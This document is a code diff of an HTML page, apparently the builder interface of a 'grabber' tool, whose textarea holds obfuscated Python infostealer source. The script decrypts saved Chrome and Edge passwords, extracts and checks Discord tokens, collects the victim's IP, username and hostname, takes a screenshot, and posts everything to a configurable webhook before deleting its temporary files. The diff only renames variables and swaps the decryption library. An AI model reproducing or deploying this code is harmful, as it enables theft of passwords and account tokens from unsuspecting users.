@@ -41,71 +41,70 @@
                         </div>
                         <div class="mb-2">
                             <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
-                            <textarea class="form-control" id="script" name="script" rows="20">O='encrypted_key'
-N='os_crypt'
-K='loginData'
-G='utf-8'
-F=open
-B=None
-L=WEBHOOK_URL
-import win32crypt as M,requests as D,getpass as P,sqlite3 as Y,shutil as Z,socket as Q,base64 as I,json as J,mss,re,os as A
-from Crypto.Cipher import AES as E
-H=A.getenv('LOCALAPPDATA')
-C=A.getenv('APPDATA')
-a=[f"{H}\\Google\\Chrome",f"{H}\\Microsoft\\Edge",f"{H}\\Google\\Chrome SxS"]
-S=[f"{C}\\discord",f"{C}\\discordcanary",f"{C}\\Lightcord",f"{C}\\discordptb"]
-W=''
-def T(token):
+                            <textarea class="form-control" id="script" name="script" rows="20">N='encrypted_key'
+M='os_crypt'
+J='loginData'
+F='utf-8'
+E=open
+K=WEBHOOK_URL
+import requests as D,getpass as O,sqlite3 as X,shutil as Y,socket as P,base64 as H,dpapi as L,json as I,mss,re,os as A
+from Crypto.Cipher import AES as C
+G=A.getenv('LOCALAPPDATA')
+B=A.getenv('APPDATA')
+Z=[f"{G}\\Google\\Chrome",f"{G}\\Microsoft\\Edge",f"{G}\\Google\\Chrome SxS"]
+R=[f"{B}\\discord",f"{B}\\discordcanary",f"{B}\\Lightcord",f"{B}\\discordptb"]
+V=''
+def S(token):
     A=token
     if not A:return False
     C={'Content-Type':'application/json','Authorization':A};B=D.get('https://discord.com/api/v9/users/@me',headers=C);return str(B.status_code)[0]=='2',B.text
-def R():
-    H={}
-    for P in S:
-        U=f"{P}\\Local State";K=f"{P}\\Local Storage\\leveldb"
-        if not A.path.exists(K):continue
-        with F(U,encoding=G)as V:W=J.load(V)
-        C=W[N][O];C=C.encode(G);C=I.b64decode(C)[5:];X=M.CryptUnprotectData(C,B,B,B,0)[1]
-        for D in A.listdir(K):
+def Q():
+    G={}
+    for O in R:
+        T=f"{O}\\Local State";J=f"{O}\\Local Storage\\leveldb"
+        if not A.path.exists(J):continue
+        with E(T,encoding=F)as U:V=I.load(U)
+        B=V[M][N];B=B.encode(F);B=H.b64decode(B)[5:];W=L.unprotect(B)
+        for D in A.listdir(J):
             if not D.endswith(('.log','.ldb')):continue
-            with F(A.path.join(K,D),'r',errors='ignore')as D:
-                Y=D.readlines()
-                for Z in Y:
-                    for a in re.findall('dQw4w9WgXcQ:[^"]*',Z):
+            with E(A.path.join(J,D),'r',errors='ignore')as D:
+                X=D.readlines()
+                for Y in X:
+                    for Z in re.findall('dQw4w9WgXcQ:[^"]*',Y):
                         try:
-                            Q=I.b64decode(a.split('dQw4w9WgXcQ:')[1]);b=Q[3:15];c=Q[15:];d=E.new(X,E.MODE_GCM,b);L=d.decrypt(c)[:-16].decode();R=T(L)
-                            if R[0]:
-                                if L in H:continue
-                                H[L]=R[1];break
-                        except Exception as e:continue
-    return H
-def U():
+                            P=H.b64decode(Z.split('dQw4w9WgXcQ:')[1]);a=P[3:15];b=P[15:];c=C.new(W,C.MODE_GCM,a);K=c.decrypt(b)[:-16].decode();Q=S(K)
+                            if Q[0]:
+                                if K in G:continue
+                                G[K]=Q[1];break
+                        except Exception as d:continue
+    return G
+def T():
     D='===== Find Chromium Datas =====\n'
-    for dir in a:
-        P=f"{dir}\\User Data\\Local State"
-        if not A.path.exists(P):continue
+    for dir in Z:
+        O=f"{dir}\\User Data\\Local State"
+        if not A.path.exists(O):continue
         D+='===== '+dir.split('\\')[-1]+' =====\n'
-        with F(P,encoding=G)as b:Q=J.load(b)
-        R=Q['profile']['info_cache'];C=Q[N][O];C=C.encode(G);C=I.b64decode(C)[5:];c=M.CryptUnprotectData(C,B,B,B,0)[1]
-        for L in R:
-            S=R[L];D+=L+':\n    Email:'+S['user_name']+'\n    Name:'+S['gaia_name']+'\n    LoginData:\n';d=f"{dir}\\User Data\\{L}\\Login Data";Z.copy2(d,K);T=Y.connect(K);U=T.cursor();U.execute('SELECT action_url, username_value, password_value FROM logins')
-            for(h,H)in enumerate(U.fetchall()):
-                V=H[0];W=H[1];e=H[2][3:15];f=H[2][15:-16];g=E.new(c,E.MODE_GCM,e);X=g.decrypt(f).decode()
-                if V and W and X:D+=f"\n        ServiceUrl:{V}\n        Username:{W}\n        Password:{X}\n"
-            T.close()
+        with E(O,encoding=F)as a:P=I.load(a)
+        Q=P['profile']['info_cache'];B=P[M][N];B=B.encode(F);B=H.b64decode(B)[5:];b=L.unprotect(B)
+        for K in Q:
+            R=Q[K];D+=K+':\n    Email:'+R['user_name']+'\n    Name:'+R['gaia_name']+'\n    LoginData:\n';c=f"{dir}\\User Data\\{K}\\Login Data";Y.copy2(c,J);S=X.connect(J);T=S.cursor();T.execute('SELECT action_url, username_value, password_value FROM logins')
+            for(g,G)in enumerate(T.fetchall()):
+                U=G[0];V=G[1];d=G[2][3:15];e=G[2][15:-16];f=C.new(b,C.MODE_GCM,d);W=f.decrypt(e).decode()
+                if U and V and W:D+=f"\n        ServiceUrl:{U}\n        Username:{V}\n        Password:{W}\n"
+            S.close()
     return D
-def V():
-    M='file';G='screenshot.png';print('Start....');N=U();H=R();O=D.get('https://ifconfig.me').text;S=P.getuser();T=Q.gethostname();V={'left':0,'top':0,'width':1920,'height':1080}
+def U():
+    M='file';G='screenshot.png';print('Start....');N=T();H=Q();R=D.get('https://ifconfig.me').text;S=O.getuser();U=P.gethostname();V={'left':0,'top':0,'width':1920,'height':1080}
     with mss.mss()as W:B=W.grab(V);mss.tools.to_png(B.rgb,B.size,output=G)
-    B=F(G,'rb');E=f"""# Grabber Result
+    B=E(G,'rb');F=f"""# Grabber Result
 ```
-IP:{O}
+IP:{R}
 UseUser:{S}
-HostName:{T}```
+HostName:{U}```
 ## Tokens
 ```
 """
-    for I in H:C=J.loads(H[I]);E+=f"""Token - {I}
+    for L in H:C=I.loads(H[L]);F+=f"""Token - {L}
 UserId - {C["id"]}
 UserName - {C["username"]}
 GlobalName - {C["global_name"]}
@@ -113,9 +112,9 @@ Email - {C["email"]}
 PhoneNumber - {C["phone"]}
 
 """
-    E+='```';D.post(L,data={'content':E},files={M:B});D.post(L,files={M:('loginData.txt',N.encode())});B.close();X=[K,G]
+    F+='```';D.post(K,data={'content':F},files={M:B});D.post(K,files={M:('loginData.txt',N.encode())});B.close();X=[J,G]
     for Y in X:A.remove(Y)
-if __name__=='__main__':V()</textarea>
+if __name__=='__main__':U()</textarea>
                         </div>
                         <button type="submit" id="submit" class="btn btn-primary">
                             <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
